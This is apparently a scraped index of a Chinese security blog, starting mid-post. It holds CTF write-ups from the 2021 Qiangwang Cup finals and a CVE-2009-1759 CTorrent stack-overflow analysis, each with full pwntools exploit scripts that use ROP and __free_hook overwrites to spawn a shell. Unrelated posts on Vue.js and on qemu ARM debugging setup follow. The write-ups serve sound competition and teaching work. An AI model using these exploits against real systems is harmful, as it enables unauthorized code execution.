]────────────────────────────────────────────────────────────────── 0x401717 leave 0x401718 ret ↓ ► 0x40168d call 0x4015ab \u003c0x4015ab\u003e 0x401692 lea rax, [rbp - 0x10] 0x401696 lea rsi, [rip + 0x9ac] 0x40169d mov rdi, rax 0x4016a0 call strcmp@plt \u003cstrcmp@plt\u003e 0x4016a5 test eax, eax 0x4016a7 jne 0x4016b0 \u003c0x4016b0\u003e 0x4016a9 mov eax, 0 0x4016ae jmp 0x4016cd \u003c0x4016cd\u003e ──────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7ffce71cf610 —▸ 0x7ffce71cf600 —▸ 0x404800 ◂— 0x0 01:0008│ 0x7ffce71cf618 —▸ 0x401707 ◂— mov dword ptr [rbp - 4], eax 02:0010│ 0x7ffce71cf620 —▸ 0x7ffce71cf630 —▸ 0x7ffce71cf640 ◂— 0x0 03:0018│ 0x7ffce71cf628 —▸ 0x40159a ◂— test eax, eax 04:0020│ 0x7ffce71cf630 —▸ 0x7ffce71cf640 ◂— 0x0 05:0028│ 0x7ffce71cf638 —▸ 0x401735 ◂— mov eax, 0 06:0030│ 0x7ffce71cf640 ◂— 0x0 07:0038│ 0x7ffce71cf648 —▸ 0x7fa550cce0b3 (__libc_start_main+243) ◂— mov edi, eax ────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────── ► f 0 0x40168d f 1 0x0 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u003e 接下来就是ROP了，并且溢出大小完全够用，我们选择溢出修改这次调用的vul_read()的返回地址。 以下payload便是第一轮ROP链，能通过stdout地址leak libc并重新返回到main函数进行下一次ROP。 p.sendafter(\"client send \u003e\u003e \", \"A\" * 0x10) p.sendafter(\"continue?(0:no, 1:yes): \", p64(0x404500) + p64(0x40168d)) pop_rsi_r15 = 0x4017a1 # pop rsi ; pop r15 ; ret pop_rdi = 0x4017a3 # pop rdi ; ret printf_plt = 0x401100 stdout = 0x404020 empty_ret = 0x40101a main_fucntion = 0x4016CF padding = 0x8 payload = b\"A\" * padding payload += flat([pop_rdi, stdout, empty_ret, printf_plt]) payload += p64(empty_ret) + p64(main_fucntion) # sleep(1) p.sendline(payload) 最终exp如下，需要多跑几次 #!/usr/bin/env python # -*- coding: utf-8 -*- \"\"\" dydxh / AAA \"\"\" from pwn import * import sys, os, re context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h', '-p', '75'] # p = remote('172.20.5.31', 22423) p = process(\"./easy_go\") def exploit() : # beautyexp.hook(p) # init_connect() # gdb.attach(p, \"b *0x0401717\") p.sendafter(\"client send \u003e\u003e \", \"A\" * 0x10) p.sendafter(\"continue?(0:no, 1:yes): \", p64(0x404500) + p64(0x40168d)) pop_rsi_r15 = 0x4017a1 # pop rsi ; pop r15 ; ret pop_rdi = 0x4017a3 # pop rdi ; ret printf_plt = 0x401100 stdout = 0x404020 empty_ret = 0x40101a main_fucntion = 0x4016CF padding = 0x8 payload = b\"A\" * padding payload += flat([pop_rdi, stdout, empty_ret, printf_plt]) payload += p64(empty_ret) + p64(main_fucntion) # sleep(1) p.sendline(payload) msg = p.recvuntil('\\x7f').ljust(8, b'\\x00') libc_addr = u64(msg) - 0x1ec6a0 print(\"libc addr: 0x{:x}\".format(libc_addr)) input() environ_addr = libc_addr + 0x1ef2e0 pop_rax = libc_addr + 0x4a550 # pop rax ; ret pop_rdx_r12 = libc_addr + 0x11c371 # pop rdx ; pop r12 ; ret syscall_addr = libc_addr + 0x2584d # syscall p.sendafter(\"client send \u003e\u003e \", b\"A\" * 0x10) p.sendafter(\"continue?(0:no, 1:yes): \", p64(0x404500) + p6","date":"2021-07-15","objectID":"/2021/07/qwb2021/:2:3","tags":null,"title":"强网杯总决赛 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"s2a ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:3:0","tags":null,"title":"强网杯总决赛 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"Overall 这是一个svg解析器（语法类似于xml），可以将用户输入的svg文件解析并打印出图像。 '1. New picture.\\n' '2. Show picture.\\n' '3. Delete picture.\\n' 漏洞点在于没有边界检查，在show功能中有以下代码片段，会将所有\u003cpath\u003e标签依次解析，找到其指定的位置，赋予颜色。buf为二维动态数组，两个维度的idx都没有大小检测，使利用变得简单。 do { if ( (v7-\u003etype \u0026 0xFD) == 4 ) { v8 = (path_attr *)v7-\u003eattr; if ( v8 ) { v9 = (path_node *)v8-\u003epath; if ( v8-\u003epath ) { color = v8-\u003estroke_color; buf[v9-\u003ex][v9-\u003ey + 1] = color; // forget to check x, y for ( ptr = v9-\u003enext; ptr; buf[next_x][next_y + 1] = color ) { next_x = ptr-\u003ex; next_y = ptr-\u003ey; ptr = ptr-\u003enext; } } } } v7 = v7-\u003eend_node; } while ( v7 ); ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:3:1","tags":null,"title":"强网杯总决赛 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"Details 该二维数组由malloc再malloc实现，只要在堆上找到buf后面的libc相关地址（比如free过的unsorted bin地址），在一维解析时就可以弄到libc那边，再在二维解析时调整偏移。由于颜色是用户可控的，所以可以在libc地址进行任意次任意地址写。 buf = (char **)malloc(8 * v3); if ( (_DWORD)v3 ) { i = 0LL; *buf = (char *)malloc(cvs_width + 2); ... 可以先修改stdout的write_base来泄露libc地址，然后改free_hook为system地址提权。 exp如下（ubt20.04，原题版本18.04） #!/usr/bin/env python # -*- coding: utf-8 -*- \"\"\" N0p / AAA \"\"\" from pwn import * import sys, os, re context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h', '-p', '75'] p = process(\"../s2a\", aslr=False) libc = ELF(\"../s2a\").libc # p = remote('172.20.5.31', 11002) def recvptr(self): return u64(self.recvn(6).ljust(8, b\"\\x00\")) pwnlib.tubes.remote.remote.recvptr = recvptr pwnlib.tubes.process.process.recvptr = recvptr def chose(n): p.sendlineafter(\"choice:\", str(n)) def add(a0=\"0\", a1=\"\u003csvg\u003eAAA\u003c/svg\u003e\"): chose(\"1\") p.sendafter(\"idx:\", (str(a0)+\"\\n\")[:]) p.sendafter(\"Input:\", (str(a1)+\"\\n\")[:]) def show(a0=\"0\"): chose(\"2\") p.sendafter(\"idx:\", (str(a0)+\"\\n\")[:]) def delete(a0=\"0\"): chose(\"3\") p.sendafter(\"idx:\", (str(a0)+\"\\n\")[:]) with open(\"test.svg\", \"rb\") as fp: data = fp.read() with open(\"test2.svg\", \"rb\") as fp: data2 = fp.read() with open(\"test3.svg\", \"rb\") as fp: data3 = fp.read() with open(\"test4.svg\", \"rb\") as fp: data4 = fp.read() #0x555555554000+0x7846 # bps.append(\"*0x555555554000+0x779E\") add(0, data) add(1, data2) add(2, data3) show(2) add(3, data2) add(4, data) delete(3) delete(1) show(0) p.recvn(9) libc.addr = p.recvptr() - 0x1eb980 free_hook = libc.addr + libc.sym['__free_hook'] magic_addr = libc.addr + libc.sym['system'] print(hex(libc.addr)) print(hex(free_hook)) print(hex(magic_addr)) delete(0) data5 = \"\"\"\u003csvg width=\"4\" height=\"4\" viewBox=\"0 0 4 4\"\u003e\\n\"\"\" for i in range(6): x = '\u003cpath d=\"M{},110\" stroke=\"#{}\"/\u003e\\n'.format(0x2aa7+i, (hex(magic_addr \u0026 0xff)[2:])*3) data5 += x magic_addr \u003e\u003e= 8 data5 += \"\"\"\u003c/svg\u003e\"\"\" add(0, data5) # gdb.attach(p, \"b *0x555555554000+0x7846\") show(0) delete(0) add(0, '\u003ccat flag;\\x00\u003e') # print(p.recvline()) # p.close() p.interactive() /test.svg \u003csvg width=\"4\" height=\"4\" viewBox=\"0 0 4 4\"\u003e \u003cpath d=\"M2752,110\"/\u003e \u003cpath d=\"M2752,110\" stroke=\"#181818\"/\u003e \u003cpath d=\"M2783,110\"/\u003e \u003c/svg\u003e /test2.svg \u003csvg version=\"111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\" width=\"800\" height=\"800\" viewBox=\"0 0 800 800\"\u003e \u003cpath d=\"M1,1\"/\u003e \u003c/svg\u003e /test3.svg \u003csvg width=\"4\" height=\"4\" viewBox=","date":"2021-07-15","objectID":"/2021/07/qwb2021/:3:2","tags":null,"title":"强网杯总决赛 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"vmnote ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:4:0","tags":null,"title":"强网杯总决赛 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"Overall vmpwn，实现了自己的指令集，并且在note.bin中用自己的指令集写了一个菜单。但漏洞不在菜单里，还是在指令上。在读size或者读idx的时候会有一个off-by-null，在虚拟机内部导致覆盖rbp低字节。 ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:4:1","tags":null,"title":"强网杯总决赛 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"Details 只允许orw x1do0@x1do0:~/linux_share/qwb_final/vmnote/vmnote$ seccomp-tools dump ./vmnote line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x01 0x00 0xc000003e if (A == ARCH_X86_64) goto 0003 0002: 0x06 0x00 0x00 0x00000000 return KILL 0003: 0x20 0x00 0x00 0x00000000 A = sys_number 0004: 0x15 0x00 0x01 0x0000000f if (A != rt_sigreturn) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0006: 0x15 0x00 0x01 0x000000e7 if (A != exit_group) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0008: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x15 0x00 0x01 0x00000000 if (A != read) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0012: 0x15 0x00 0x01 0x00000001 if (A != write) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0014: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0016 0015: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0016: 0x15 0x00 0x01 0x00000101 if (A != openat) goto 0018 0017: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0018: 0x15 0x00 0x01 0x0000000c if (A != brk) goto 0020 0019: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0020: 0x06 0x00 0x00 0x00000000 return KILL 先提取解析note.bin的指令内容 from pwn import * regs = [0 for i in range(12)] stack = [] global rip, code, data data = [] rip = 0x0 rsp = 0x1000 tmp_rsp = 0 def open_file(): global code, data with open(\"../note.bin\", \"rb\") as f: all_data = f.read() code = all_data[0x10:0x774+0x10] data = all_data[0x774+0x10:] def translate(): global rip, code while True: print(\"label_%x: \" % rip) val = u8(code[rip:rip+1]) rip += 1 types =(val \u003e\u003e 5) \u0026 7 opcode = val \u0026 0x1F if opcode == 0: print(\"push reg[%d]\" % u8(code[rip:rip+1])) rip += 1 elif opcode == 1: if types == 1: print(\"mov reg[%d], word ptr data[reg[%d]]\" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2]))) rip += 2 elif types == 3: print(\"mov reg[%d], dword ptr data[reg[%d]]\" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2]))) rip += 2 elif types == 4: print(\"mov reg[%d], qword ptr data[reg[%d]]\" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2]))) rip += 2 elif opcode == 2: print(\"nop\") rip += 1 elif opcode == 3: reg = u8(code[rip:rip+1]) rip += 1 if types == 0: print(\"read char reg[%d]\" % reg) elif types == 1: print(\"read int reg[%d]\" % reg) elif types == 2: print(\"read long reg[%d]\" % reg) else: print(\"read char data[reg[%d]]\" % reg) elif opcode == 4: print(\"leave\") elif opcode == 5: if types == 1: print(\"sub byte ptr reg[%d], 0x%x\" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2]))) rip += 2 if types == 2: print(\"sub word ptr reg[%d], 0x%x\" % (u8(code[rip:rip+1]), u16(code[rip + 1:rip + 3]))) rip += 1 + 2 elif types == 3: print(\"sub dword ptr reg[%d], 0x%x\" % (u8(code[rip:rip+1]), u32(code[rip + 1:rip + 5]))) rip += 1 + 4 elif types == 4: print(\"sub qword ptr reg[%d], 0x%x\" % (u8(code[rip:rip+1]), u64(code[rip + 1:rip + 9]))) rip += 1 + 8 else: print(\"sub reg[%d], reg[%d]\" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2]))) rip += 2 elif opcode == 6: print(\"nop\") rip += 1 elif opcode == 7: if types == 1: print(\"add byte ptr reg[%d], 0x%x\" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2]))) rip += 2 if types == 2: print(\"add word ptr reg[%d], 0x%x\" % (u8(code[rip:rip+1]), u16(code[rip + 1:rip + 3]))) rip += 1 + 2 elif types == 3: print(\"add dword ptr reg[%d], 0x%x\" % (u8(code[rip:rip+1]), u32(code[rip + 1:rip + 5]))) rip += 1 + 4 elif types == 4: print(\"add qword ptr reg[%d], 0x%x\" % (u8(code[rip:rip+1]), u64(code[rip + 1:rip + 9]))) rip += 1 + 8 else: print(\"add reg[%d], reg[%d]\" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2]))) rip += 2 elif opcode == 8: reg, idx = u8(code[rip:rip+1]), u32(code[rip + 1:rip + 5]) if types == 1: print(\"mov byte ptr data[0x%x], reg[%d]\" % (idx, reg)) rip += 5 if types == 2: print(\"mov word ptr data[0x%x], reg[%d]\" % (idx, reg)) rip += 5 elif types == 3: print(\"mov dword ptr data[0x%x], reg[%d]\" % (idx, reg)) rip += 5 elif types == 4: print(\"mov qword ptr data[0x%x], reg[%d]\" % ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:4:2","tags":null,"title":"强网杯总决赛 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"Tips 这题有亿点麻烦，由于栈的随机化脸黑的话很难调，但是由于是虚拟指令模拟的栈，所以可以考虑将rand patch掉以便调试。 ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:4:3","tags":null,"title":"强网杯总决赛 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"Overall .torrent文件是BT种子文件格式，CTorrent是该文件格式的解析器。由于解析器解析过程中某个解析函数缺少长度检测，在解析由用户可控大小的Path时会将用户输入memcpy到栈上定长buffer，可造成栈溢出，ROP提权。 复现契机来自于强网先锋[强网杯2021final] ","date":"2021-07-12","objectID":"/2021/07/cve-2009-1759/:1:0","tags":null,"title":"CVE-2009-1759 BT文件解析器栈溢出漏洞解析","uri":"/2021/07/cve-2009-1759/"},{"categories":["PWN"],"content":"Details ctf赛题为Enhanced CTorrentdnh3.3.1的nday，尝试下载对应版本的ctorrent源码，可以看到在解析torrent文件时会调用btfiles.cpp/btFiles::BuildFromMI() 关键部分如上图，可以看到path为定长数组，在decode_list2path()中将其作为参数传入。bencode.cpp/decode_list2path()将用户指定大小的内容memcpy到path中，而并没有进行长度检测，导致溢出。 bencode为BT种子的编码格式，详见 https://zh.wikipedia.org/wiki/Bencode 经过分析，该函数是在解析torrent结构的FILES时，若path是list时调用的解析函数。我们可以精心构造path，通过栈溢出去做ROP or shellcode. 以强网先锋为例，exp如下 from pwn import * context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'info' context.terminal = ['tmux', 'splitw', '-h', '-p', '75'] io = process(\"./ctorrent\", aslr=False) # 0x15555502aea2 -\u003e crash # 0x402c7f ret # 0x402c7e pop rdi, ret # 0x400f24 \"sh\\x00\" # 0x4022A0 system # p64(0x402c7f) + rop = b'A' * 4152 + p64(0x402c7f) + p64(0x402c7e) + p64(0x400f24) + p64(0x4022A0) size = 4176 + 8 pay = b\"d\" pay += b\"8:announce\" pay += b\"20:http://0000/announce\" pay += b\"13:creation date\" pay += b\"i1111e\" pay += b\"4:info\" pay += b\"d\" ################ pay += b\"5:files\" pay += b\"ld\" pay += b\"4:path\" pay += b\"l\" pay += bytes(str(size).encode(\"utf-8\")) + b\":\" pay += rop # when parsing, memcpy to stack causing oveflow. pay += b\"e\" pay += b\"6:length\" pay += b\"i2222e\" pay += b\"ee\" ################ pay += b\"4:name\" pay += b\"4:4444\" pay += b\"12:piece length\" pay += b\"i3333e\" pay += b\"6:pieces\" pay += b\"20:\" + bytes.fromhex(\"9f3d4e7c80e58146707d9e8ace218ee33cefeca9\") pay += b\"ee\" # with open(\"./vul.torrent\", \"wb\") as f: # f.write(pay) # with open(\"./pay\", \"rb\") as f: # pay = f.read() # b *0x40a2d8 # gdb.attach(io, \"b *0x15555502afbc\") # print(pay) io.sendlineafter(\" Size of your torrent file \u003e\\n\", str(len(pay))) io.sendlineafter(\"Please input your torrent file \u003e\\n\", pay) io.interactive() 读者可以在0x40a2d8处断下，体会溢出点在哪儿。 ","date":"2021-07-12","objectID":"/2021/07/cve-2009-1759/:2:0","tags":null,"title":"CVE-2009-1759 BT文件解析器栈溢出漏洞解析","uri":"/2021/07/cve-2009-1759/"},{"categories":["PWN"],"content":"More 这题直接跳转到system(“sh\\x00”)并不能打通，调试system函数发现在该位置处产生segment fault. 查阅资料发现 movaps：单精度浮点数指令，必须16字节对齐 movups：单精度浮点数指令，不需要16字节对齐 所以需要再找一个ret的gadget，把栈向上抬到任意16字节对齐的位置即可。 成功打通 事后找到了出现类似问题的帖子 看来也算是自己重新踩了一遍坑。 ","date":"2021-07-12","objectID":"/2021/07/cve-2009-1759/:3:0","tags":null,"title":"CVE-2009-1759 BT文件解析器栈溢出漏洞解析","uri":"/2021/07/cve-2009-1759/"},{"categories":["PWN"],"content":"Reference https://www.securityfocus.com/bid/34584/discuss https://www.scaprepo.com/control.jsp?command=search\u0026search=CVE-2009-1759\u0026SCAP-TOKEN=O1B0-JQFA-GM0R-MFK8-VQE6-JHQX-JFU0-FJVG https://www.exploit-db.com/exploits/8470 ","date":"2021-07-12","objectID":"/2021/07/cve-2009-1759/:4:0","tags":null,"title":"CVE-2009-1759 BT文件解析器栈溢出漏洞解析","uri":"/2021/07/cve-2009-1759/"},{"categories":["Pause-and-Ponder"],"content":"最近写应用程序感觉 python,java 的 gui 太丑了，咨询了一波web爷爷。在一星期内从零开始入门了前后端分离的开发框架，并成功赶在实验截止日期前套用，治好了我的强迫症. 在这个过程中不成体系且稀碎地顺手记录了一下，权当纪念这段爆肝的日子。 技术栈如下，主要学习量为vue.js 前端 vue.js element-ui electron 后端 python flask 学习路线 (html, css, js) -\u003e Vue.js html 4.20 css 4.21 Javascript 4.22-4.23 vue、electron 4.24-4.25 整体来说对vue.js与electron还是一知半解，但也顺利地摸出了前端 ","date":"2021-04-20","objectID":"/2021/04/vue_js0/:0:0","tags":null,"title":"Vue.js 初探","uri":"/2021/04/vue_js0/"},{"categories":["Pause-and-Ponder"],"content":"HTML HyperText Markup Language https://www.runoob.com/html/html-tutorial.html HTML 不是一种编程语言，而是一种标记语言 标记语言是一套标记标签 (markup tag) Web浏览器用于读取HTML文件，不直接显示HTML标签，而是使用标签展示HTML页面内容 vscode 安装open in browser插件，alt+b即可用默认游览器打开 tips 属性值本身就含有双引号，那么您必须使用单引号，例如：name=‘John “ShotGun” Nelson’ 当显示页面时，浏览器会移除源代码中多余的空格和空行。所有连续的空格或空行都会被算作一个空格。 清华镜像站 bakground:#22222 白:white 蓝:#6793cf 用\u0026#x表示特定字符，x为其ascii码 ","date":"2021-04-20","objectID":"/2021/04/vue_js0/:1:0","tags":null,"title":"Vue.js 初探","uri":"/2021/04/vue_js0/"},{"categories":["Pause-and-Ponder"],"content":"CSS Cascading Style Sheets https://www.runoob.com/css/css-intro.html tips （内联样式）Inline style \u003e （内部样式）Internal style sheet \u003e（外部样式）External style sheet \u003e 浏览器默认样式 1em和当前字体大小相等，=16px 盒子模型 ","date":"2021-04-20","objectID":"/2021/04/vue_js0/:2:0","tags":null,"title":"Vue.js 初探","uri":"/2021/04/vue_js0/"},{"categories":["Pause-and-Ponder"],"content":"JavaScript https://www.runoob.com/js/js-statements.html tips 脚本语言，逐行执行，而不是先整体编译 注释、一行后面有；、function格式 \u003cscript\u003e function myfuc(a, b) { // document.getElementById(\"demo\"); alert(a + b); return 1; } \u003c/script\u003e document.write()直接写到html上。如果网页已经加载完了再触发该函数（比如onclick），将覆盖整个html 大小写敏感，驼峰法的命名规则（eg. myFirstName） 重新声明值不会丢 var carname=\"Volvo\"; var carname; // 仍然是\"Volvo\" 具有动态数据类型， 值类型(基本类型)：字符串（String）、数字(Number)、布尔(Boolean)、对空（Null）、未定义（Undefined）、Symbol。 引用数据类型：对象(Object)、数组(Array)、函数(Function)。 var x; // x 为 undefined var x = 5; // 现在 x 为数字 var x = \"John\"; // 现在 x 为字符串 ","date":"2021-04-20","objectID":"/2021/04/vue_js0/:3:0","tags":null,"title":"Vue.js 初探","uri":"/2021/04/vue_js0/"},{"categories":["Pause-and-Ponder"],"content":"Vue3+electron 开始摸实验了… python flask开后端服务器 element ui组件库写前端组件 electron打包 ","date":"2021-04-20","objectID":"/2021/04/vue_js0/:4:0","tags":null,"title":"Vue.js 初探","uri":"/2021/04/vue_js0/"},{"categories":["Pause-and-Ponder"],"content":"Day1 前端 vue启动 注册、登录组件 注册、登录初级校验 传递参数给后端 后端返回参数 后端 flask启动 从前端接收参数 传输参数给后端 注册、登录数据库校验 axios POST到python后端成功 ","date":"2021-04-20","objectID":"/2021/04/vue_js0/:4:1","tags":null,"title":"Vue.js 初探","uri":"/2021/04/vue_js0/"},{"categories":["Pause-and-Ponder"],"content":"Day2 前端 后端 打包 把electron-quick-start git下来，进去修改main.js，直接把electron当作浏览器，先把vue跑起来，然后直接读这个端口。 // and load the index.html of the app. mainWindow.loadURL('http://127.0.0.1:8081') 如下命令跑起来 npm install npm start 用electron读取网页变为应用程序 下面我们把它彻底包成exe 安装electron-packager npm install -g electron-packager 进入electron-quick-start目录 electron.packager . 得到了彻底前后端分离的高端产物 至此，便完成了一整套开发流程。 更多见 https://github.com/xidoo123/cp-lab5 ","date":"2021-04-20","objectID":"/2021/04/vue_js0/:4:2","tags":null,"title":"Vue.js 初探","uri":"/2021/04/vue_js0/"},{"categories":["Pause-and-Ponder"],"content":"Some birds aren’t meant to be caged，their feathers are just too bright. ","date":"2021-02-12","objectID":"/2021/02/diary0/:0:0","tags":null,"title":"Wh1t3zZ 封禁3周年祭","uri":"/2021/02/diary0/"},{"categories":["PWN"],"content":"qemu是GNU/linux上十分常用的模拟处理器，可以在ubuntu下跑arm\\mips甚至riscv等几乎所有架构的可执行文件，一台机器上可以虚拟化为多种架构的机器。 system mode：系统模式，模拟整个电脑系统，包括中央处理器及其他周边设备。它使得跨平台编写程序得测试与debug工作变得更容易，但是配置比较麻烦，需要在里面起一个linux虚拟机 user mode：用户模式，模拟解析可执行文件的指令，比较方便且功能够用，暂时只记录user模式 ","date":"2021-01-23","objectID":"/2021/01/armpwn/:0:0","tags":null,"title":"ARM PWN 调试环境搭建","uri":"/2021/01/armpwn/"},{"categories":["PWN"],"content":"安装qemu-user ubuntu下 sudo apt-get install qemu user模式支持的架构下载，暂时完全够用了 sudo apt install qemu-user 下载static版本（可选） sudo apt-get install -y qemu-user-static 下载完成后，qemu-自动补全可以看到其支持的架构十分全面 (base) pwn@ubuntu:~$ qemu- qemu-aarch64 qemu-mips qemu-riscv32 qemu-aarch64_be qemu-mips64 qemu-riscv32-static qemu-aarch64_be-static qemu-mips64el qemu-riscv64 qemu-aarch64-static qemu-mips64el-static qemu-riscv64-static qemu-alpha qemu-mips64-static qemu-s390x qemu-alpha-static qemu-mipsel qemu-s390x-static qemu-arm qemu-mipsel-static qemu-sh4 qemu-armeb qemu-mipsn32 qemu-sh4eb qemu-armeb-static qemu-mipsn32el qemu-sh4eb-static qemu-arm-static qemu-mipsn32el-static qemu-sh4-static qemu-cris qemu-mipsn32-static qemu-sparc qemu-cris-static qemu-mips-static qemu-sparc32plus qemu-debootstrap qemu-nbd qemu-sparc32plus-static qemu-hppa qemu-nios2 qemu-sparc64 qemu-hppa-static qemu-nios2-static qemu-sparc64-static qemu-i386 qemu-or1k qemu-sparc-static qemu-i386-static qemu-or1k-static qemu-system-aarch64 qemu-img qemu-ppc qemu-system-arm qemu-io qemu-ppc64 qemu-tilegx qemu-m68k qemu-ppc64abi32 qemu-tilegx-static qemu-m68k-static qemu-ppc64abi32-static qemu-x86_64 qemu-make-debian-root qemu-ppc64le qemu-x86_64-static qemu-microblaze qemu-ppc64le-static qemu-xtensa (base) pwn@ubuntu:~$ ","date":"2021-01-23","objectID":"/2021/01/armpwn/:0:1","tags":null,"title":"ARM PWN 调试环境搭建","uri":"/2021/01/armpwn/"},{"categories":["PWN"],"content":"运行qemu-user 最近*ctf2021中遇到一题名为babypac，是arm64架构 (pwn) pwn@ubuntu:~/share/starctf/babypac$ ls chall chall.i64 chall_patched cmd ld-linux-aarch64.so.1 lib libc.so.6 (pwn) pwn@ubuntu:~/share/starctf/babypac$ checksec ./chall [*] '/mnt/hgfs/linux_share/starctf/babypac/chall' Arch: aarch64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 可以自己配环境，把库全部加到/lib以后用如下命令启动 qemu-aarch64 ./chall 更方便的是指定路径参数等，具体见-h $ qemu-aarch64 -h usage: qemu-aarch64 [options] program [arguments...] Linux CPU emulator (compiled for aarch64 emulation) Options and associated environment variables: Argument Env-variable Description -h print this help -help -g port QEMU_GDB wait gdb connection to 'port' -L path QEMU_LD_PREFIX set the elf interpreter prefix to 'path' -s size QEMU_STACK_SIZE set the stack size to 'size' bytes -cpu model QEMU_CPU select CPU (-cpu help for list) -E var=value QEMU_SET_ENV sets targets environment variable (see below) -U var QEMU_UNSET_ENV unsets targets environment variable (see below) -0 argv0 QEMU_ARGV0 forces target process argv[0] to be 'argv0' -r uname QEMU_UNAME set qemu uname release string to 'uname' -B address QEMU_GUEST_BASE set guest_base address to 'address' -R size QEMU_RESERVED_VA reserve 'size' bytes for guest virtual address space -d item[,...] QEMU_LOG enable logging of specified items (use '-d help' for a list of items) -dfilter range[,...] QEMU_DFILTER filter logging based on address range -D logfile QEMU_LOG_FILENAME write logs to 'logfile' (default stderr) -p pagesize QEMU_PAGESIZE set the host page size to 'pagesize' -singlestep QEMU_SINGLESTEP run in singlestep mode -strace QEMU_STRACE log system calls -seed QEMU_RAND_SEED Seed for pseudo-random number generator -trace QEMU_TRACE [[enable=]\u003cpattern\u003e][,events=\u003cfile\u003e][,file=\u003cfile\u003e] -version QEMU_VERSION display version information and exit Defaults: QEMU_LD_PREFIX = /etc/qemu-binfmt/aarch64 QEMU_STACK_SIZE = 8388608 byte You can use -E and -U options or the QEMU_SET_ENV and QEMU_UNSET_ENV environment variables to set and unset environment variables for the target process. It is possible to provide several variables by separating them by commas in getsubopt(3) style. Additionally it is possible to provide the -E and -U options multiple times. The following lines are equivalent: -E var1=val2 -E var2=val2 -U LD_PRELOAD -U LD_DEBUG -E var1=val2,var2=val2 -U LD_PRELOAD,LD_DEBUG QEMU_SET_ENV=var1=val2,var2=val2 QEMU_UNSET_ENV=LD_PRELOAD,LD_DEBUG Note that if you provide several changes to a single variable the last change will stay in effect. See \u003chttps://qemu.org/contribute/report-a-bug\u003e for how to report bugs. More information on the QEMU project at \u003chttps://qemu.org\u003e. 用-L指定来lib位置即可，我们直接运行如下命令就可以跑起来 qemu-aarch64 -cpu max -L . ./chall 当然，出题人帮我们写了个启动脚本，只要正确安装qemu并且有aarch64架构便能直接运行。 (pwn) pwn@ubuntu:~/share/starctf/babypac$ ./cmd # # #### ##### ###### # # # # # # ### ### # # ##### # # # # # # # # # # # #### # # ","date":"2021-01-23","objectID":"/2021/01/armpwn/:0:2","tags":null,"title":"ARM PWN 调试环境搭建","uri":"/2021/01/armpwn/"},{"categories":["PWN"],"content":"调试ARM 先安装gdb-multiarch sudo apt-get gdb-multiarch 以*CTF2021 babypac为例，调试bash如下，选择端口为23333 #!/bin/sh gdb-multiarch -q \\ -ex 'set architecture aarch64' \\ # 指定架构 -ex 'file chall' \\ # 指定文件 -ex 'target remote localhost:23333' \\ # 指定端口 -ex 'break *0x400C00' \\ -ex 'break *0x400FF0' \\ # 下断点 -ex continue \\ ; exp中-g指定端口，-L指定lib位置 io = process([\"qemu-aarch64\", \"-cpu\", \"max\", \"-g\", \"23333\", \"-L\", \".\", \"./chall\"]) 然后先跑exp，再跑bash就能进行调试 ","date":"2021-01-23","objectID":"/2021/01/armpwn/:0:3","tags":null,"title":"ARM PWN 